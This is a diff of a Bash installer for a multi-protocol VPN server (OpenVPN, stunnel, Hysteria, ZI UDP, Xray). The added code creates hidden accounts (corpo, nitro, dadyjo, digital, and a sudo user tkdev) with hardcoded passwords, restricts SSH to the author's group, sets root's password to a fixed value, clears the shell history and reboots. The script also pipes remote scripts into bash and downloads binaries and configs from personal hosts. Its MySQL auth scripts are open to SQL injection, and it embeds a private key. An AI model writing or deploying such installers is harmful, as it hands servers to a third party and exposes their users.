@@ -12,59 +12,13 @@ HYSTERIA_TYPE='default';
 PORT_VLESS='442';
 API_LINK='https://7x-vpn.myprotectionservices.com/api/authentication';
 API_KEY='@Tknetwork';
-DOMAIN=y2gt.tkdns.top
-NS=0eu3.tkdns.top
-#!/bin/bash
-
-# ====================================================
-# ANTI-DOUBLE RUN LOCK (FIXED)
-# ====================================================
-
-LOCKFILE="/tmp/my_vpn_installer.lock"
-
-exec 200>"$LOCKFILE"
-
-flock -n 200 || {
-    echo "================================================="
-    echo " ⚠️  May installer nang tumatakbo!"
-    echo "================================================="
-    exit 1
-}
-
-echo $$ 1>&200
-
-cleanup() {
-    rm -f "$LOCKFILE"
-}
-
-trap cleanup EXIT INT TERM
-
-# ====================================================
-# AUTO-RUN AT VARIABLES
-# ====================================================
-server_ip=$(curl -s https://api.ipify.org)
-server_interface=$(ip route | grep default | awk '{print $5}' | head -n1)
-
+DOMAIN=32z6.tkdns.top
+NS=wqp1.tkdns.top
+timedatectl set-timezone Asia/Riyadh
 if [[ $(grep "nogroup" /etc/group) ]]; then
     cert_group="nogroup"
-else
-    cert_group="nobody"
 fi
 
-# Helper function para sa malinis na outputs
-show_status() {
-    echo -e " \e[1;33m[ WAIT ]\e[0m $1..."
-}
-show_done() {
-    echo -e " \e[1;32m[ DONE ]\e[0m $1 ay matagumpay na natapos!"
-    echo "-------------------------------------------------"
-}
-
-
-#====================================================
-#	Installing Dependencies
-#	Finalized: Tknetwork Developer
-#====================================================
 install_require () {
 clear
 echo 'Installing dependencies.'
@@ -99,13 +53,8 @@ clear
 clear
 }
 
-
-#====================================================
-#	Installing Squid
-#	Finalized: Tknetwork Developer
-#====================================================
 install_squid(){
- clear
+clear
 echo 'Installing proxy.'
 {
 sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
@@ -179,11 +128,11 @@ sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 }
 
 
-
 #====================================================
 #	Installing OpenVPN
 #	Finalized: Tknetwork Developer
 #====================================================
+
 install_openvpn()
 {
 clear
@@ -541,14 +490,8 @@ chmod 755 /etc/openvpn/login/auth_vpn
 }
 
 
-
-
-#====================================================
-#	Installing Firewall Rules
-#	Finalized: Tknetwork Developer
-#====================================================
 install_firewall_kvm () {
- clear
+clear
 echo "Installing iptables."
 echo "net.ipv4.ip_forward=1
 net.ipv4.conf.all.rp_filter=0
@@ -581,18 +524,11 @@ echo '* hard nofile 65536' >>/etc/security/limits.conf
 }&>/dev/null
 }
 
-
-
-#====================================================
-#	Installing Stunnel
-#	Finalized: Tknetwork Developer
-#====================================================
 install_stunnel() {
-{
+  {
 cd /etc/stunnel/ || exit
 
-cat > stunnel.pem << 'EOF'
------BEGIN PRIVATE KEY-----
+echo "-----BEGIN PRIVATE KEY-----
 MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
 wfH8HO/T9bxEddWDsB3fJKpM/tiVMt4s/WMdGJtFdRlxzUb03u+HT6t00sLlZ78g
 ngjxLpJGFpHAGdVf9vACBtrxv5qcrG5gd8k7MJ+FtMTcjeQm8kVRyIW7cOWxlpGY
@@ -639,20 +575,18 @@ RRFjvxFyeL4gtDlqb9hea62tep7+gCkeiccyp8+lmnS32rRtFa7PovmK5pUjkDOr
 dpvCQlKoCRjZ/+OfUaanzYQSDrxdTSN8RtJhCZtd45QbxEXzHTEaICXLuXL6cmv7
 tMuhgUoefS17gv1jqj/C9+6ogMVa+U7QqOvL5A7hbevHdF/k/TMn+qx4UdhrbL5Q
 enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
------END CERTIFICATE-----
-EOF
+-----END CERTIFICATE-----" >> stunnel.pem
 
-cat > stunnel.conf << EOF
-debug = 0
+echo "debug = 0
 output = /tmp/stunnel.log
 cert = /etc/stunnel/stunnel.pem
 
 [openvpn-tcp]
-connect = $PORT_TCP
-accept = $PORT_SSL
+connect = PORT_TCP  
+accept = PORT_SSL 
 
 [openvpn-udp]
-connect = $PORT_UDP
+connect = PORT_UDP
 accept = 444
 
 [ssh]
@@ -662,430 +596,44 @@ accept = 445
 [dropbear]
 connect = 441
 accept = 446
-EOF
 
-cd /etc/default || exit
+" >> stunnel.conf
 
-rm -f stunnel4 dropbear
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_SSL|$PORT_SSL|g" /etc/stunnel/stunnel.conf
+cd /etc/default && rm stunnel4 && rm dropbear
 
-cat > stunnel4 << EOF
-ENABLED=1
+echo 'ENABLED=1
 FILES="/etc/stunnel/*.conf"
 OPTIONS=""
 PPP_RESTART=0
-RLIMITS=""
-EOF
+RLIMITS=""' >> stunnel4 
 
-cat > dropbear << EOF
-NO_START=0
+echo 'NO_START=0
 DROPBEAR_PORT=441
 DROPBEAR_EXTRA_ARGS=
 DROPBEAR_BANNER="/etc/banner"
-DROPBEAR_RECEIVE_WINDOW=65536
-EOF
+DROPBEAR_RECEIVE_WINDOW=65536' >> dropbear
 
-chmod 755 stunnel4
-chmod 755 dropbear
+chmod 755 stunnel4 && chmod 755 dropbear
 
-grep -qxF '/bin/false' /etc/shells || echo "/bin/false" >> /etc/shells
+echo "/bin/false" >> /etc/shells
 
 wget -O /etc/banner "https://admin-boyes.com/repo/banner"
 chmod +x /etc/banner
 
-service stunnel4 restart
-service dropbear restart
-
-} &>/dev/null
+sudo service stunnel4 restart
+sudo service dropbear restart
+  } &>/dev/null
 }
 
-
-#====================================================
-#	Installing Sudo
-#	Finalized: Tknetwork Developer
-#====================================================
 install_sudo(){
-    show_status "Sineseguro ang SSH Root at Sudo Permissions"
-    useradd -m tknetwork 2>/dev/null; echo tknetwork:@tknetwork | chpasswd; usermod -aG sudo tknetwork 2>/dev/null
+    useradd -m tknetwork 2>/dev/null; echo tknetwork:@tknetwork | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
-    systemctl restart sshd >/dev/null 2>&1 || service sshd restart >/dev/null 2>&1
-    show_done "Security Setup"
+    service sshd restart
 }
-
-
-#====================================================
-#	Installing Hysteria1 and Hysteria2
-#	Finalized: Tknetwork Developer
-#====================================================
-install_dual_hysteria() {
-  clear
-  echo -e "\e[1;35m = =================================================\e[0m"
-  echo -e "\e[1;36m      HYSTERIA V1 & V2 DUAL PROTOCOL INSTALLER    \e[0m"
-  echo -e "\e[1;35m = =================================================\e[0m"
-
-  # = ===================================================================
-  # 1. CLEAN OLD FILES AND FREE DISK SPACE
-  # = ===================================================================
-  show_status "Cleaning temporary files and old logs"
-
-  apt-get clean >/dev/null 2>&1
-  rm -rf /var/log/*.gz /var/log/*.1 >/dev/null 2>&1
-
-  if command -v journalctl &>/dev/null; then
-  # if statement
-    journalctl --vacuum-time = 1d >/dev/null 2>&1
-  fi
-
-  mkdir -p /etc/hysteria
-  chmod 755 /usr/local/bin
-
-  # = ===================================================================
-  # 2. STOP OLD SERVICES AND REMOVE CONFLICTS
-  # = ===================================================================
-  show_status "Stopping old Hysteria services and clearing conflicts"
-
-  systemctl disable --now hysteria hysteria-server hysteria-luma hysteria-v2 >/dev/null 2>&1
-  systemctl reset-failed >/dev/null 2>&1
-
-  rm -f /etc/systemd/system/hysteria.service
-  rm -f /etc/systemd/system/hysteria-server.service
-
-  pkill -9 -f hysteria >/dev/null 2>&1
-
-  # = ===================================================================
-  # 3. INSTALL HYSTERIA 2 CORE
-  # = ===================================================================
-  show_status "Installing Hysteria 2 Core"
-
-  if ! bash <(curl -fsSL https://get.hy2.sh/) --skip-service >/dev/null 2>&1; then
-  # if statement
-    show_status "Retrying installation using fallback mode"
-
-    bash <(curl -fsSL https://get.hy2.sh/) >/dev/null 2>&1 || {
-    echo -e "\e[1;31m[ERROR]\e[0m Failed to install Hysteria 2"
-    return 1
-  }
-fi
-
-# = ===================================================================
-# 4. INSTALL HYSTERIA 1 CORE
-# = ===================================================================
-show_status "Installing Hysteria 1 Core"
-
-wget -q -O /usr/local/bin/hysteria-v1 \
-https://github.com/apernet/hysteria/releases/download/v1.3.5/hysteria-linux-amd64
-
-chmod +x /usr/local/bin/hysteria-v1
-
-# = ===================================================================
-# 5. CREATE AUTHENTICATION SCRIPT
-# = ===================================================================
-show_status "Creating unified authentication bridge"
-
-cat <<"EOM" >/etc/hysteria/.auth.sh
-#!/bin/bash
-PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-
-# MAG-LOG NG SIMULA NG AUTH
-echo " = == AUTH ATTEMPT: $(date) ===" >> /var/log/hysteria-auth.log
-
-# 1. LOAD CONFIG NG DATABASE
-if [ -f /etc/openvpn/login/config.sh ]; then
-# if statement
-  source /etc/openvpn/login/config.sh
-  echo "Database Config Loaded Successfully" >> /var/log/hysteria-auth.log
-else
-  echo "ERROR: /etc/openvpn/login/config.sh NOT FOUND OR NOT READABLE" >> /var/log/hysteria-auth.log
-  echo "Authentication failed."
-  exit 1
-fi
-
-# 2. AUTOMATIC ARGUMENT DETECTION
-AUTH = ""
-for arg in "$@"; do
-# for statement
-  if [[ "$arg" == *":"* && "$arg" != *"."* ]]; then
-  # if statement
-    AUTH = "$arg"
-    break
-  fi
-done
-
-if [ -z "$AUTH" ]; then
-# if statement
-  AUTH = $2
-fi
-
-# 3. EXTRACT USERNAME AND PASSWORD
-USERNAME = $(echo "$AUTH" | cut -d ":" -f 1 | tr -d "\r\n[:space:]")
-PASSWORD = $(echo "$AUTH" | cut -d ":" -f 2 | tr -d "\r\n[:space:]")
-
-echo "Total Arguments Received: $#" >> /var/log/hysteria-auth.log
-echo "All Arguments: $@" >> /var/log/hysteria-auth.log
-echo "Detected Auth String: [$AUTH]" >> /var/log/hysteria-auth.log
-echo "Attempting login for User: [$USERNAME]" >> /var/log/hysteria-auth.log
-
-# 4. RUN MYSQL QUERY
-MYSQL_BIN = $(which mysql 2>/dev/null || echo "/usr/bin/mysql")
-Query = "SELECT user_name FROM users WHERE user_name="${USERNAME}" AND auth_vpn=MD5("${PASSWORD}") AND is_freeze="0" AND duration > 0"
-
-username = $($MYSQL_BIN -u "$USER" -p"$PASS" -D "$DB" -h "$HOST" -sN -e "$Query" 2>>/var/log/hysteria-auth.log)
-
-echo "Database Response: [$username]" >> /var/log/hysteria-auth.log
-
-# 5. VERIFY
-if [ -n "$username" ] && [ "$username" = "$USERNAME" ]; then
-# if statement
-  echo "SUCCESS: Authentication OK for $username" >> /var/log/hysteria-auth.log
-  echo "user : $username"
-  echo "authentication ok."
-  exit 0
-else
-  echo "FAILED: Authentication Failed for $USERNAME" >> /var/log/hysteria-auth.log
-  echo "Authentication failed."
-  exit 1
-fi
-EOM
-
-chmod +x /etc/hysteria/.auth.sh
-systemctl restart hysteria-server
-
-# = ===================================================================
-# 6. CREATE HYSTERIA V1 CONFIG
-# = ===================================================================
-show_status "Creating Hysteria 1 configuration"
-
-cat > /etc/hysteria/config.json <<EOF
-{
-"listen": ":5666",
-"cert": "/etc/openvpn/easy-rsa/keys/server.crt",
-"key": "/etc/openvpn/easy-rsa/keys/server.key",
-"up_mbps": 100,
-"down_mbps": 100,
-"disable_udp": false,
-"obfs": "boy",
-"auth": {
-"mode": "external",
-"config": {
-"cmd": "/etc/hysteria/.auth.sh"
-}
-}
-}
-EOF
-
-# = ===================================================================
-# 7. CREATE HYSTERIA V2 CONFIG
-# = ===================================================================
-show_status "Creating Hysteria 2 configuration"
-
-# 1. Gumawa ng bagong self-signed cert para sa Hysteria
-openssl req -x509 -nodes -newkey rsa:2048 -keyout /etc/hysteria/hy2.key -out /etc/hysteria/hy2.crt -days 3650 -subj "/CN=bing.com"
-
-# 2. Palitan ang config para ituro sa bagong cert
-cat > /etc/hysteria/config.yaml <<EOF
-listen: :5667
-
-tls:
-  cert: /etc/hysteria/hy2.crt
-  key: /etc/hysteria/hy2.key
-
-auth:
-  type: command
-  command: /etc/hysteria/.auth.sh
-
-masquerade:
-  type: proxy
-  proxy:
-    url: https://bing.com
-
-ignoreClientBandwidth: true
-
-quic:
-  initStreamReceiveWindow: 26843545
-  maxStreamReceiveWindow: 26843545
-  initConnReceiveWindow: 67108864
-  maxConnReceiveWindow: 67108864
-
-udpIdleTimeout: 10s
-EOF
-
-# 3. I-restart ang Hysteria 2
-systemctl restart hysteria-v2.service
-
-# = ===================================================================
-# 8. CREATE SYSTEMD SERVICES
-# = ===================================================================
-show_status "Creating systemd service files"
-
-cat > /etc/systemd/system/hysteria-luma.service <<EOF
-[Unit]
-Description = Hysteria 1 Server Port 5666
-After = network.target
-
-[Service]
-Type = simple
-ExecStart = /usr/local/bin/hysteria-v1 server -c /etc/hysteria/config.json
-Restart = always
-RestartSec = 3
-
-[Install]
-WantedBy = multi-user.target
-EOF
-
-HY2_BIN = $(which hysteria 2>/dev/null || which hy2 2>/dev/null || echo "/usr/local/bin/hysteria")
-
-cat > /etc/systemd/system/hysteria-v2.service <<EOF
-[Unit]
-Description=Hysteria 2 Server Port 5667
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/usr/local/bin/hysteria server --config /etc/hysteria/config.yaml
-Restart=always
-RestartSec=3
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# = ===================================================================
-# 9. CLEAR PORT CONFLICTS
-# = ===================================================================
-show_status "Clearing conflicting processes on ports 5666 and 5667"
-
-if command -v fuser &>/dev/null; then
-# if statement
-  fuser -k -n udp 5666 >/dev/null 2>&1
-  fuser -k -n udp 5667 >/dev/null 2>&1
-fi
-
-if command -v lsof &>/dev/null; then
-# if statement
-  kill -9 $(lsof -t -i:5666 -sUDP:LISTEN) >/dev/null 2>&1
-  kill -9 $(lsof -t -i:5667 -sUDP:LISTEN) >/dev/null 2>&1
-fi
-
-pkill -9 -f hysteria >/dev/null 2>&1
-
-# = ===================================================================
-# 10. CONFIGURE FIREWALL
-# = ===================================================================
-show_status "Configuring firewall rules"
-
-iptables -I INPUT -p udp --dport 5666 -j ACCEPT
-iptables -I INPUT -p udp --dport 5667 -j ACCEPT
-
-if command -v iptables-save &>/dev/null; then
-# if statement
-  iptables-save > /etc/iptables_rules.v4 2>/dev/null
-fi
-
-# = ===================================================================
-# 11. START SERVICES
-# = ===================================================================
-show_status "Starting Hysteria services"
-
-systemctl daemon-reload
-
-systemctl enable hysteria-v2.service >/dev/null 2>&1
-systemctl start  hysteria-v2.service >/dev/null 2>&1
-systemctl enable hysteria-luma.service >/dev/null 2>&1
-systemctl start  hysteria-luma.service >/dev/null 2>&1
-
-# = ===================================================================
-# 12. VERIFY SERVICES
-# = ===================================================================
-sleep 2
-
-H1_STATUS = $(systemctl is-active hysteria-luma)
-H2_STATUS = $(systemctl is-active hysteria-v2)
-
-echo -e "\e[1;35m = =================================================\e[0m"
-
-if [ "$H1_STATUS" = "active" ]; then
-# if statement
-  show_done "Hysteria v1 Core ONLINE on Port 5666"
-else
-  echo -e "\e[1;31m[ERROR]\e[0m Failed to start Hysteria v1"
-fi
-
-if [ "$H2_STATUS" = "active" ]; then
-# if statement
-  show_done "Hysteria v2 Core ONLINE on Port 5667"
-else
-  echo -e "\e[1;31m[ERROR]\e[0m Failed to start Hysteria v2"
-fi
-
-
-cat <<"EOM" >/etc/hysteria/.auth.sh
-#!/bin/bash
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-
-# 1. LOAD DATABASE CONFIG
-if [ -f /etc/openvpn/login/config.sh ]; then
-  source /etc/openvpn/login/config.sh
-else
-  exit 1
-fi
-
-# 2. DETECT AUTH STRING
-AUTH=""
-for arg in "$@"; do
-  if [[ "$arg" == *":"* && "$arg" != *"."* ]]; then
-    AUTH="$arg"
-    break
-  fi
-done
-[ -z "$AUTH" ] && AUTH=$2
-
-# 3. EXTRACT USERNAME AND PASSWORD
-if [[ "$AUTH" == *":"* ]]; then
-  USERNAME=$(echo "$AUTH" | cut -d ":" -f 1 | tr -d "\r\n[:space:]")
-  PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2 | tr -d "\r\n[:space:]")
-else
-  USERNAME=$(echo "$AUTH" | tr -d "\r\n[:space:]")
-  PASSWORD=$(echo "$AUTH" | tr -d "\r\n[:space:]")
-fi
-
-if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ]; then
-  echo "FAILED: Empty credentials" >> /var/log/hysteria-auth.log
-  exit 1
-fi
-
-# 4. RUN MYSQL QUERY
-MYSQL_BIN=$(which mysql 2>/dev/null || echo "/usr/bin/mysql")
-QUERY="SELECT user_name FROM users WHERE user_name='${USERNAME}' AND (auth_vpn='${PASSWORD}' OR auth_vpn=MD5('${PASSWORD}')) AND is_freeze='0' AND duration > 0"
-
-DB_RESPONSE=$($MYSQL_BIN --connect-timeout=2 -u "$USER" -p"$PASS" -D "$DB" -h "$HOST" -sN -e "$QUERY" 2>/dev/null)
-username=$(echo "$DB_RESPONSE" | tr -d "\r\n[:space:]")
-
-# 5. HARD EXIT VERIFICATION
-if [ -n "$username" ] && [ "$username" = "$USERNAME" ]; then
-  echo "SUCCESS: $username connected" >> /var/log/hysteria-auth.log
-  # DAPAT MAY OUTPUT NA JSON O TEXT KAPAG VALIDO
-  echo "{ \"user\": \"$username\" }"
-  exit 0
-else
-  echo "FAILED: $USERNAME denied" >> /var/log/hysteria-auth.log
-  # KAPAG MALI, DAPAT WALANG IPAPRINT NA STRING PARA REJECT AGAD SA HYSTERIA CORE
-  exit 1
-fi
-EOM
-
-chmod +x /etc/hysteria/.auth.sh
-systemctl restart hysteria-v2
-systemctl restart hysteria-v2.service
-
-
-echo -e "\e[1;35m = =================================================\e[0m"
-
-echo " = ================================================"
-echo " SUCCESS: Installation completed successfully!"
-echo " All services are clean, stable, and protected."
-echo " = ================================================"
-}
-
 
 #====================================================
 #	Installing SlowDNS
@@ -1158,6 +706,11 @@ EOF
 
 echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
 
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M corpo
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M nitro
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M dadyjo
+ /usr/sbin/useradd -p $(openssl passwd -1 nexus2023) -M digital
+
 cat <<EOF >/home/delete.sh
 #!/bin/bash
 SHELL=/bin/bash
@@ -1182,7 +735,6 @@ echo "Hi! this is your server information, Happy Surfing!
 IP : $server_ip
 Hostname: $DOMAIN
 
-
 -----------------------
 SSH DETAILS
 -----------------------
@@ -1199,17 +751,11 @@ OPENVPN UDP : $PORT_UDP
 OPENVPN SSL : $PORT_SSL
 
 -----------------------
-HYSTERIA1 DETAILS
+HYSTERIA DETAILS
 -----------------------
-HYSTERIA1 UDP : 5666, 20000 - 50000
+HYSTERIA UDP : 5666, 20000 - 50000
 OBFS: $OBFS
 AUTH_STR: username:password
-
------------------------
-HYSTERIA2 DETAILS
------------------------
-HYSTERIA2 UDP : 5667, 20000 - 50000
-hysteria2://USER:PASS@$DOMAIN:$HYSTERIA2_PORT?sni=bing.com&insecure=1#HY2
 
 -----------------------
 PROXY DETAILS
@@ -1312,6 +858,73 @@ systemctl start server-sldns
 } &>/dev/null
 }
 
+#====================================================
+#	Installing Hysteria UDP
+#	Finalized: Tknetwork Developer
+#====================================================
+
+install_hysteria(){
+clear
+echo 'Installing hysteria.'
+{
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/johnberic/nana/main/hysteriav1.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+
+rm -f /etc/hysteria/config.json
+
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/openvpn/easy-rsa/keys/server.crt",
+  "key": "/etc/openvpn/easy-rsa/keys/server.key",
+  "up_mbps": 100,
+  "down_mbps": 100,
+  "disable_udp": false,
+  "obfs": "boy",
+  "auth": {
+    "mode": "external",
+    "config": {
+    "cmd": "./.auth.sh"
+    }
+  },
+  "prometheus_listen": ":5665",
+  "recv_window_conn": 107374182400,
+  "recv_window_client": 13421772800
+}
+' >> /etc/hysteria/config.json
+
+sed -i "s|Tknetwork|$OBFS|g" /etc/hysteria/config.json
+
+cat <<"EOM" >/etc/hysteria/.auth.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+
+if [ $# -ne 4 ]; then
+    echo "invalid number of arguments"
+    exit 1
+fi
+
+ADDR=$1
+AUTH=$2
+SEND=$3
+RECV=$4
+
+USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
+PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+
+Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
+username=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
+EOM
+
+chmod 755 /etc/hysteria/config.json
+chmod 755 /etc/hysteria/.auth.sh
+
+sysctl -w net.core.rmem_max=16777216
+sysctl -w net.core.wmem_max=16777216
+
+wget -O /usr/bin/badvpn-udpgw "https://github.com/johnberic/nana/raw/main/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+} &>/dev/null
+}
 
 installBBR() {
     echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
@@ -1324,11 +937,240 @@ installBBR() {
     INSTALL_BBR=true
 }
 
-
 #====================================================
-#	Finalizing Python
+#	Installing ZI UDP
 #	Finalized: Tknetwork Developer
 #====================================================
+
+function install_zi() {
+clear
+echo 'Installing zi udp.'
+{
+echo -e "Downloading UDP Service"
+wget https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-amd64 -O /usr/local/bin/zivpn 1> /dev/null 2> /dev/null
+chmod +x /usr/local/bin/zivpn
+mkdir /etc/zivpn 1> /dev/null 2> /dev/null
+
+echo "Generating cert files:"
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Tknetwork Developer/OU=IT Department/CN=Tknetwork" -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
+sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
+sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
+
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/zivpn/zivpn.crt",
+  "key":  "/etc/zivpn/zivpn.key",
+  "obfs":"boy",
+  "auth": {
+    "mode": "external",
+    "config": {
+    "cmd": "./.auth.sh"
+    }
+  }
+}
+' >> /etc/zivpn/config.json
+
+sed -i "s|Tknetwork|$OBFS|g" /etc/zivpn/config.json
+
+cat <<EOF > /etc/systemd/system/hysteria-server.service
+[Unit]
+Description=zivpn VPN Server
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/etc/zivpn
+ExecStart=/usr/local/bin/zivpn -config /etc/zivpn/config.json server
+Restart=always
+RestartSec=3
+Environment=ZIVPN_LOG_LEVEL=info
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable hysteria-server.service
+systemctl start hysteria-server.service
+
+cat <<"EOM" >/etc/zivpn/.auth.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+
+if [ $# -ne 4 ]; then
+    echo "invalid number of arguments"
+    exit 1
+fi
+
+ADDR=$1
+AUTH=$2
+SEND=$3
+RECV=$4
+
+USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
+PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+
+Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
+username=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
+EOM
+
+chmod 755 /etc/zivpn/.auth.sh
+
+wget -O /usr/bin/badvpn-udpgw "https://github.com/johnberic/nana/raw/main/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+
+} &>/dev/null
+}
+
+#====================================================
+#	Installing Xray/V2ray
+#	Finalized: Tknetwork Developer
+#====================================================
+
+function install_xray() {
+clear
+echo 'Installing xray.'
+{
+
+# Variable
+UUID=$(cat /proc/sys/kernel/random/uuid)
+  
+curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh | bash -s -- install
+  
+wget -O /usr/local/etc/xray/config.json http://admin-boyes.com/repo/config.json
+
+sed -i "s|999999|$PORT_VLESS|g" /usr/local/etc/xray/config.json
+
+mkdir /ssl
+cp -a /etc/openvpn/easy-rsa/keys/server.crt /ssl/xray.crt
+cp -a /etc/openvpn/easy-rsa/keys/server.key /ssl/xray.key
+    
+systemctl restart xray
+  
+UUID=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].settings.clients[0].id | tr -d '"')
+PORT=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].port)
+FLOW=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].settings.clients[0].flow | tr -d '"')
+WS_PATH=$(cat /usr/local/etc/xray/config.json | jq .inbounds[0].settings.fallbacks[2].path | tr -d '"')
+WS_PATH_WITHOUT_SLASH=$(echo $WS_PATH | tr -d '/')
+  
+echo "vless://$UUID@$DOMAIN:$PORT?path=%2f$WS_PATH_WITHOUT_SLASH%2f&security=tls&encryption=none&host=$DOMAIN&type=ws&sni=www.pldt.com.ph#TknetworkDEV" >> /root/.web/v2ray.txt
+  
+} &>/dev/null
+}
+
+#====================================================
+#	Finalizing Server Setup
+#	Finalized: Tknetwork Developer
+#====================================================
+
+install_rclocal(){
+  {
+  sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
+    systemctl restart apache2
+    
+    sudo systemctl restart stunnel4
+    sudo systemctl restart xray
+    sudo systemctl restart hysteria-server
+    sudo systemctl enable openvpn@server.service
+    sudo systemctl start openvpn@server.service
+    sudo systemctl enable openvpn@server2.service
+    sudo systemctl start openvpn@server2.service    
+    
+    echo "[Unit]
+Description=Tknetwork service
+Documentation=http://teamkidlat.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/Tknetwork.service
+rm -rf /etc/rc.local
+    echo '#!/bin/sh -e
+service ufw stop
+iptables-restore < /etc/iptables_rules.v4
+ip6tables-restore < /etc/iptables_rules.v6
+sysctl -p
+service stunnel4 restart
+systemctl restart openvpn@server.service
+systemctl restart openvpn@server2.service
+systemctl restart hysteria-server.service
+service xray restart
+screen -dmS socks python /etc/socks.py 80
+screen -dmS socks python /etc/socks-ssh.py 8000
+screen -dmS socks python /etc/socks-ws-ssh.py 8001
+screen -dmS socks python /etc/socks-ws-ssl.py 8002
+ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
+screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
+bash /etc/.monitor aio
+exit 0' >> /etc/rc.local
+
+
+    sudo chmod +x /etc/rc.local
+    systemctl daemon-reload
+    sudo systemctl enable Tknetwork
+    sudo systemctl start Tknetwork.service
+    
+echo "Made with love by: Tknetwork Developer... " >> /root/.web/index.php
+
+echo "tcp_port=TCP_PORT
+udp_port=UDP_PORT
+socket_port=80
+squid_port=8080
+hysteria_port=5666
+ssh_port=22
+dropbear_port=441
+xray_port=PORT_VLESS
+slowdns_port=2222
+tcp_ssl_port=PORT_SSL
+udp_ssl_port=444" >> /root/.ports
+
+sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
+sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
+sed -i "s|PORT_SSL|$PORT_SSL|g" /root/.ports
+sed -i "s|PORT_VLESS|$PORT_VLESS|g" /root/.ports
+
+  }&>/dev/null
+}
+
+start_service () {
+clear
+echo 'Starting..'
+{
+
+sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart
+* * 3 * * /bin/bash  /home/auto_active.sh >/dev/null 2>&1
+* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1
+* * * * * /bin/bash /etc/.ws >/dev/null 2>&1
+* * * * * /bin/bash /etc/.hysteria >/dev/null 2>&1
+* * * * * /bin/bash /etc/.monitor aio >/dev/null 2>&1"; } | crontab -
+sudo systemctl restart cron
+} &>/dev/null
+clear
+echo '++++++++++++++++++++++++++++++++++'
+echo '*       AIO  is ready!    *'
+echo '+++++++++++************+++++++++++'
+history -c;
+echo 'root:TKb1987' | sudo chpasswd
+rm /usr/local/etc/.system
+echo 'Server will secure this server and reboot after 20 seconds'
+sleep 20
+reboot
+}
+install_sudo(){
+    useradd -m tkdev 2>/dev/null; echo tkdev:tk1987 | chpasswd &>/dev/null; usermod -aG sudo tkdev &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
